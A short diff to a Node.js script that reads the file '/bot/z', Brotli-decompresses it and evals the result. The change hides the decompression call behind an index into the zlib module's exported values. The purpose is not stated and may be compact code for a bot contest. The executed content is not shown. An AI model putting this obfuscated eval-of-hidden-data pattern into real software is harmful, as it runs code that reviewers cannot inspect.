@@ -1,4 +1,4 @@
 r=require
-f=r('fs')
-eval(''+r('zlib').brotliDecompressSync(
-f.readFileSync('/bot/z')))
+u=r('fs')
+eval(''+Object.values(r('zlib'))[29](
+u.readFileSync('/bot/z')))
